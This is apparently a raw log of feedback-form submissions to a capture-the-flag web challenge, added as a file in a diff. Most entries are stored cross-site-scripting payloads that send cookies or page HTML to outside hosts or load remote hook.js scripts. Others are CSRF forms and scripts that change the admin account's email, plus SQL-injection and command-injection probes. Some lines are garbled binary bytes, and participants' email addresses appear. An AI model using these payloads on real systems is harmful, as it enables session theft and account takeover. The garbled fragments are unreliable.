@@ -1,0 +1,4508 @@
+<script>alert(1);</script><script>
+top.location="http://ex.wargame.vn:8080/xss/xss.php?"+document.cookie;
+</script>
+<script>
+top.location="http://ex.wargame.vn:8080/xss/xss.php?"+document.cookie;
+</script>
+<script>
+top.location="http://ex.wargame.vn:8080/xss/xss.php?"+document.cookie;
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("xss.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+top.location="http://ex.wargame.vn:8080/xss/xss.php";
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("xss.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+top.location="http://ex.wargame.vn:8080/xss/xss.php";
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php?act=change", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+top.location="http://ex.wargame.vn:8080/xss/xss.php";
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php?act=change", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+top.location="http://ex.wargame.vn:8080/xss/xss.php";
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php?act=change", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+top.location="http://ex.wargame.vn:8080/xss/xss.php";
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+</script>
+<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script>
+  $.post("index.php", {"email":"teo@mailinator.com", "confirm":"Change Email"});
+</script>
+ditme
+<form action="http://challenges.wargame.vn:1337/web100xxxxxxxxxx/?act=change" method="POST">
+<input name="password" value="123456">
+<input name="email" value="gamma95@gmail.com">
+<input name="confirm" value="Change Email">
+</form>
+<script>document.forms[0].submit();</script>
+<script>alert(1);</script>
+'''''
+'''
+
+a'
+a'
+a'
+'` -- - '' ```
+aaaaa'
+Duy
+abc
+123
+aaa
+admin
+
+aaa
+"><script>alert(1)</script>
+rrr
+dqs
+dqs
+dqs
+r
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>
+sadfdf
+flag
+'
+mario.castle@challenges.wargame.vn
+test
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>'
+asd
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie);</script>
+dsf
+'
+"
+'"eos><
+<img src="http://109.111.143.109:12345/test.jpg" /> =)
+123
+123
+f33db4ck
+F33db4ck
+123
+789
+<img src='http://120.72.98.104:81' />
+ffff
+'
+<asd>
+adsfasdfasd
+123
+lol'
+aaaaa
+123
+'
+123
+xxx"><script>alert(1)</script>
+asdf
+'
+"
+\
+1234
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c="-ocument.cookie;</script>
+<script>alert(flag:)</script>
+<img src='http://ctf.wargame.vn:81' />
+dfdfdf
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs";</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs";</script>
+FuckBack
+bvghh
+test
+tetst
+ok
+ok
+d·
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+yah
+<script>
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+xmlHttp.responseText;
+</script>
+fuck
+<script>
+function toHex(str) {
+    var hex = '';
+    for(var i=0;i<str.length;i++) {
+        hex %2b= ''%2b str.charCodeAt(i).toString(16);
+    }
+    return hex;
+}
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+toHex(xmlHttp.responseText);
+</script>
+<script>
+function toHex(str) {
+    var hex = '';
+    for(var i=0;i<str.length;i++) {
+        hex %2b= ''%2b str.charCodeAt(i).toString(16);
+    }
+    return hex;
+}
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"%2btoHex(xmlHttp.responseText);
+</script>
+<script>
+function toHex(str) {
+    var hex = '';
+    for(var i=0;i<str.length;i%2b%2b) {
+        hex %2b= ''%2b str.charCodeAt(i).toString(16);
+    }
+    return hex;
+}
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"%2btoHex(xmlHttp.responseText);
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"%2bencodeURIComponent(xmlHttp.responseText);
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"%2bxmlHttp.responseText;
+</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs";
+</script>
+feedback
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs";
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("GET", "http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/", false );
+xmlHttp.send(null);
+document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+encodeURIComponent(xmlHttp.responseText);
+</script>
+aaaaaaa
+wtf
+i'm admin, what's your flag?
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+</script>
+
+http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?username=admin&password=&email=toilaabc123%40yahoo.com&confirm=Forgot%3F
+<script src="http://109.111.143.109:3000/hook.js"></script>
+<h1>hello!</h1>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+</script>
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+</script>
+
+12121
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=t";
+</script>
+
+i'm admin but i forgot the flag, give me a copy!
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+document.location="http://nurfed.madoka.be/test/cookie.php?c=t";
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=xxx&newpassword=xxx&email=&confirm=Change Password");
+</script>
+
+12121212
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change Email");
+</script>
+
+=.=
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change Email");
+</script>
+
+http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change&username=admin&password=123456&newpassword=123456&email=toilaabc123@yahoo.com&confirm=Change+Email
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+xmlhttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change Email");
+</script>
+
+"><script>location.href = 'http://sovietw0rm.tk/'+document.cookie;</script>
+http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change&username=admin&password=123456&newpassword=123456&email=toilaabc123@yahoo.com&confirm=Change+Email
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlhttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("password=&newpassword=&email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<SCRIPT type="text/javascript">
+alert('flag');
+</SCRIPT>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("password%3D%26newpassword%3D%26email%3Dbryandehouwer@hotmail.com%26confirm%3DChange%20Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+abc
+adus
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+afdf
+111111111111
+"><script>document.location='http://sovietw0rm.tk/'+document.cookie;</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post2";
+</script>
+
+<script>alert(1);</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send(decodeURIComponent("email=bryandehouwer@hotmail.com&confirm=Change%20Email"));
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send(decodeURIComponent("email=bryandehouwer%40hotmail.com&confirm=Change+Email"));
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<SCRIPT type="text/javascript">
+var adr = '113.172.183.156:3333/evil.php?cakemonster=' + escape(document.cookie);
+</SCRIPT>
+We will check your feedback! Please wait few minutes :)
+Thanks. Your feedback has been sent successfully! Please wait a few minutes :)
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer%40hotmail.com&confirm=Change Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer%40hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+send me the password please <script>location.href ='http://117.231.200.87/cookie='+document.cookie;</script>
+<image src="http://109.111.143.109:12345/test.png" />
+<script src="http://109.111.143.109:3000/hook.js" type="text/javascript"></script>
+<script src="http://109.111.143.109:12345/hook.js" type="text/javascript"></script>
+
+F33db4ck
+send the pass <script>location.href ='http://117.231.200.87:8080/cookie='+document.cookie;</script>
+<image src="http://109.111.143.109:12345/test.png" />
+<script src="http://109.111.143.109:3000/hook.js" type="text/javascript"></script>
+<script src="http://109.111.143.109:12345/hook.js" type="text/javascript"></script>
+
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer%40hotmail.com&confirm=Change%2bEmail");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post";
+</script>
+
+send the pass <script>location.href ='http://117.231.200.87:8080/cookie='+document.cookie;</script>
+F33db4ck
+F33db4ck
+asdf
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send(decodeURIComponent("email=bryandehouwer@hotmail.com&confirm=Change+Email"));
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+test' or 1=1 --;
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send(decodeURIComponent("email=bryandehouwer@hotmail.com&confirm=Change+Email"));
+Your password has been changed!
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+<script>alert("test");</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+<script>alert("test">;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+	$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	{
+		confirm: 'Change Email',
+		email: 'tienthanh050311@gmail.com'
+	});
+	
+	$(document).ready(function() {
+		$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+			{
+				confirm: 'Change Email',
+				email: 'tienthanh050311@gmail.com'
+			});
+	});
+</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer@hotmail.com&confirm=Change%2bEmail");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+<script>
+var xmlHttp = null;
+xmlHttp = new XMLHttpRequest();
+xmlHttp.open("POST","http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change",true);  
+xmlHttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");  
+xmlHttp.send("email=bryandehouwer%40hotmail.com&confirm=Change+Email");
+document.location="http://nurfed.madoka.be/test/cookie.php?c=post3";
+</script>
+
+help
+help me
+help queen
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+ $.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+ {
+  confirm: 'Change Email',
+  email: 'bryandehouwer@hotmail.com'
+ });
+</script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+ $.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+ {
+  confirm: 'Change Email',
+  email: 'bryandehouwer@hotmail.com'
+ });
+</script>
+Hello feedback
+sadsad
+
+<image src="http://109.111.143.109:12345/test.png" />
+<script src="http://109.111.143.109:3000/hook.js" type="text/javascript"></script>
+<script src="http://109.111.143.109:12345/hook.js" type="text/javascript"></script>
+
+F33db4ck
+<script>alert("F33db4ck");
+</script>
+is good
+`cat flag`
+"><script>document.location='http://sovietw0rm.tk:4444'+document.documentElement.outerHTML;</script>
+<script>
+document.forms[0].email.value="tycoi2005@yahoo.com"
+document.getElementsByTagName("input")[4].click()
+</script>
+safsdfsdf
+"><script>document.location='http://sovietw0rm.tk:4444'+document.cookie;</script>
+mario'
+
+
+help me please
+safsdfsdf'
+;
+
+'
+=help';
+
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.documentElement.outerHTML;</script>
+select * from flag;
+feedback
+flag
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.documentElement.innerHTML;</script>
+select * from where user = 'ngoclong';
+#
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.getElementsByTagName('html')[0].innerHTML;</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie;</script>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+	$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	{
+		confirm: 'Change Email',
+		email: 'tienthanh050311@gmail.com'
+	});
+	
+	$(document).ready(function() {
+		$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+			{
+				confirm: 'Change Email',
+				email: 'tienthanh050311@gmail.com'
+			});
+	});
+</script>
+"><script>document.location='http://sovietw0rm.tk:4444/'+document.cookie</script>
+disssssssssssss
+<script>
+document.forms[0].email.value="tycoi2005@yahoo.com";
+document.getElementsByTagName("input")[4].click();
+</script>
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+<script>
+	$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+	{
+		confirm: 'Change Email',
+		email: 'vinakid_1412@gmail.com'
+	});
+	
+	$(document).ready(function() {
+		$.post('http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change',
+			{
+				confirm: 'Change Email',
+				email: 'vinakid_1412@gmail.com'
+			});
+	});
+</script>
+fsdkafhdsjfgjsdhfksdhfjdws
+flag
+i need flag
+i need flag
+<script>
+function post(params,url){
+	var http = new XMLHttpRequest();
+	http.open("POST", url, true);
+	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	http.setRequestHeader("Content-length", params.length);
+	http.setRequestHeader("Connection", "close");
+	http.send(params);
+}
+
+post("confirm=Change Email&email=tycoi2005@yahoo.com","index.php?act=change");
+post("confirm=Forgot?","index.php");
+</script>
+<html>
+<head></head>
+<body><script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>
+</body></html>
+Hello,I'm admin but I forgot my password. Please send it back to me!
+<form method="POST" action="?act=change" id="f">
+<input type="hidden" name="password" />
+<input type="hidden" name="newpassword" />
+<input type="hidden" name="email" value="mawekl0l@gmail.com"/>
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script>
+document.getElementById("f").submit();
+</script>
+
+s‡dsafdsa
+send me a flag
+f33db4ck
+mailto:winqdeavi@shitmail.me
+Fl4g
+<form method="POST" action="/?act=change" id="f">
+<input type="hidden" name="password" />
+<input type="hidden" name="newpassword" />
+<input type="hidden" name="email" value="mawekl0l@gmail.com"/>
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script>
+document.getElementById("f").submit();
+</script>
+<script>alert(1)</script>
+<form method="POST" action="http://challenges.wargame.vn:1337/web100_f977a5eaea38b2dcd992c112bdb84b9a/?act=change" id="f">
+<input type="hidden" name="password" />
+<input type="hidden" name="newpassword" />
+<input type="hidden" name="email" value="mawekl0l@gmail.com"/>
+<input name="confirm" type="hidden" value="Change Email" />
+</form>
+<script>
+document.getElementById("f").submit();
+</script>
+<script>alert('hello world')</script>
+sdmsdfd
+http://77.123.128.34
+fdfd
+<script>location.href="http://tunelko.com/?c="+document.cookie();</script>
+fdsfs
+'
+F33b4ck
+1234
+sgdg
+1234
+<script>document.location="http://nurfed.madoka.be/test/cookie.php?c=fs"+document.cookie;</script>
+1234
+<script>document.location="http://tunelko.com?c=fs"+document.cookie;</script>10
+<script>document.location="http://tunelko.com?c=fs"+document.cookie;</script>10
+hgjkghk
+<script>document.location="http://tunelko.com?c="+document.cookie;</script>hello task
+ 
+
+
+∂ÈﬁñJö
+~V†
+~V†
+~V†
+˝Î\˛ñ¨≥
+test
+We will check your feedback! Please wait few minutes :)
+<?php
+echo "We will check your feedback! Please wait few minutes :)";
+?>
+                                                                              asdsaaaaaaaaaaaaaaaaaa
+Do you have any feedback for us?
+#ctf.WARGAME.VN
+
+˝Î\˛ñ¨≥
+˝Î\˛ñ¨≥
+äw^∆òi
+f33db4ck's channel
+<html>
+<head></head>
+<body><script src="http://ec2-50-17-24-162.compute-1.amazonaws.com:3000/hook.js" type="text/javascript"></script>
+</body></html>
+
+DENALI
+˝Î\˛ñ¨≥
+◊m
+ÜŸ•
+MILO
+test
+
+milo
+milo f33db4ck
+free track
+˝Î\˛ñ¨≥
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://tunelko.com?c="+$.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/')+""</script>
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://tunelko.com/?c="+$.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/');</script>
+<script src="http://codeorigin.jquery.com/jquery-2.0.3.min.js"><script>document.location="http://www.tunelko.com?c=" + $.get('/web100_f977a5eaea38b2dcd992c112bdb84b9a/');</script>
+˝Î\˛ñ¨≥
+˝Î\˛+,π
+<html>
+<head></head>
+<body>
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
